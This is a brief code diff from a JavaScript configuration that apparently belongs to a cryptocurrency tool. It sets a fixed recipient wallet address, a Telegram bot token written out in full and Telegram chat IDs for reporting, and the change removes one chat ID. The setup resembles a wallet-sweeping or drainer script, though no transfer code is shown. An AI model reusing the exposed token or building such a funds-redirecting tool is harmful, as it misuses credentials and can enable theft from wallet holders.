@@ -5,7 +5,7 @@ const RECIPIENT_ADDRESS = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh"
 const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U"
 const TELEGRAM_CHAT_IDS = [
   "7556622176",
-  "1801489729" // Add more chat IDs here as needed
+  // Add more chat IDs here as needed
 ]
 
 const PUBLIC_RPC_ENDPOINTS = [
